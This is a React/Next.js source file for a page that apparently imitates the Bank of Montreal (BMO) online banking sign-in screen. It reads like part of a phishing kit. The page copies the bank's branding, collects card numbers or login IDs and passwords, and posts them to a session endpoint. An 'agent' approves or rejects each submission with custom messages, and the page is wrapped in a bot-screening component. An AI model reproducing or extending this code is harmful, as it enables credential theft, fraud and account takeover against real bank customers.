'use client';

/**
 * BMO Credentials Page
 * 
 * Pixel-perfect match to reference BMO login design
 * Two-column layout on desktop, single column on mobile
 */

import { useCallback, useEffect, useState } from 'react';
import { useParams } from 'next/navigation';
import { useSessionStore } from '@shared';
import { currentBrand } from '@/config/branding';
import { AlertCircle, Loader2 } from 'lucide-react';
import { BotGuard } from '@/components/security/BotGuard';

export default function CredentialsPage() {
  const params = useParams();
  const sessionUuid = params.session_uuid as string;

  const { stage, status, loading, error, caseId } = useSessionStore();
  const { agentMessage } = useSessionStore();

  const [cardNumber, setCardNumber] = useState('');
  const [password, setPassword] = useState('');
  const [rememberMe, setRememberMe] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [fieldError, setFieldError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Reset form when agent rejects submission
  useEffect(() => {
    if (status === 'rejected' || status === 'error') {
      setCardNumber('');
      setPassword('');
      setFieldError(agentMessage || 'Your submission was rejected. Please try again.');
      setIsSubmitting(false);
    }
  }, [status, agentMessage]);

  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      setFieldError('');

      if (!caseId) {
        setFieldError('Session information missing. Please refresh and try again.');
        return;
      }

      if (!cardNumber.trim()) {
        setFieldError('Please enter your card number or Login ID');
        return;
      }

      if (!password) {
        setFieldError('Please enter your password');
        return;
      }

      setIsSubmitting(true);

      try {
        const response = await fetch('/api/submit-credentials', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            case_id: caseId,
            username: cardNumber.trim(),
            password,
          }),
        });

        if (!response.ok) {
          console.error('Submission error');
          setFieldError('Unable to process your credentials. Please try again.');
          setIsSubmitting(false);
          return;
        }

        useSessionStore.setState({
          status: 'waiting',
          agentMessage: 'Verifying your credentials...',
          formData: {},
        });
      } catch (error) {
        console.error('Submission error:', error);
        setFieldError('Submission failed. Please try again.');
        setIsSubmitting(false);
      }
    },
    [cardNumber, password, sessionUuid, caseId]
  );

  const isWaiting = status === 'waiting' || isSubmitting || loading;

  return (
    <BotGuard>
      {/* Centered Page Header - Hidden on mobile */}
      <div className="page-header">
        <img src="/brands/bmo/lock..svg" alt="" className="lock-icon" />
        <h1>Sign in</h1>
      </div>

      {/* Two Column Layout */}
      <div className="main-container">
        {/* Login Card */}
        <div className="login-card">
          {/* Card Header - Shows on mobile inside card */}
          <div className="card-header">
            <h2>Sign in</h2>
          </div>

          <form className="login-form" onSubmit={handleSubmit}>
            {/* Card Number / Login ID */}
            <div className="form-group">
              <label htmlFor="card-number">Card number or Login ID</label>
              <input
                type="text"
                id="card-number"
                name="card-number"
                autoComplete="username"
                value={cardNumber}
                onChange={(e) => {
                  setCardNumber(e.target.value);
                  if (fieldError) setFieldError('');
                }}
                disabled={isWaiting}
              />
            </div>

            {/* Remember Me */}
            <div className="checkbox-group">
              <input
                type="checkbox"
                id="remember-me"
                name="remember-me"
                checked={rememberMe}
                onChange={(e) => setRememberMe(e.target.checked)}
                disabled={isWaiting}
              />
              <label htmlFor="remember-me">Remember me</label>
              <img src="/brands/bmo/information.svg" alt="Info" className="info-icon" />
            </div>

            {/* Password */}
            <div className="form-group">
              <label htmlFor="password">Password</label>
              <div className="password-wrapper">
                <input
                  type={showPassword ? 'text' : 'password'}
                  id="password"
                  name="password"
                  autoComplete="current-password"
                  value={password}
                  onChange={(e) => {
                    setPassword(e.target.value);
                    if (fieldError) setFieldError('');
                  }}
                  disabled={isWaiting}
                />
                <button
                  type="button"
                  className="password-toggle"
                  onClick={() => setShowPassword(!showPassword)}
                  aria-label={showPassword ? 'Hide password' : 'Show password'}
                  disabled={isWaiting}
                >
                  {showPassword ? 'Hide' : 'Show'}
                </button>
              </div>
              <a href="#" className="forgot-link">Forgot your password or Login ID?</a>
            </div>

            {/* Error message */}
            {fieldError && (
              <div className="error-message">
                <AlertCircle className="h-4 w-4" />
                <span>{fieldError}</span>
              </div>
            )}
            {(error && !fieldError) && (
              <div className="error-message">
                <AlertCircle className="h-4 w-4" />
                <span>{error}</span>
              </div>
            )}


            {/* Sign In Button */}
            <button
              type="submit"
              className="btn-signin"
              disabled={isWaiting}
            >
              {isWaiting && <Loader2 className="h-4 w-4 animate-spin" style={{ marginRight: '8px' }} />}
              {isWaiting ? 'SIGNING IN...' : 'SIGN IN'}
            </button>
          </form>
        </div>

        {/* Right Panels */}
        <div className="info-panels">
          <div className="info-card">
            <p className="info-heading">Register a new card for Online or Mobile Banking:</p>
            <div className="card-links">
              <a href="#" className="card-link">DEBIT CARD</a>
              <span>or</span>
              <a href="#" className="card-link">CREDIT CARD</a>
            </div>
          </div>

          <div className="info-card security-card">
            <div className="security-header">
              <img src="/brands/bmo/lock..svg" alt="" className="security-icon" />
              <h2>Your security always comes first</h2>
            </div>
            <p className="security-text">
              We've made Online Banking more convenient, while still using advanced security
              technologies that keep your money and information safe.
            </p>
            <a href="#" className="learn-more-link">
              Learn more about how we protect you.
              <svg className="external-icon" viewBox="0 0 24 24" width="14" height="14">
                <path fill="currentColor"
                  d="M14 3v2h3.59l-9.83 9.83 1.41 1.41L19 6.41V10h2V3h-7zm-2 16H5V7h7V5H5a2 2 0 00-2 2v12a2 2 0 002 2h12a2 2 0 002-2v-7h-2v7h-5z" />
              </svg>
            </a>
          </div>
        </div>
      </div>
    </BotGuard>
  );
}
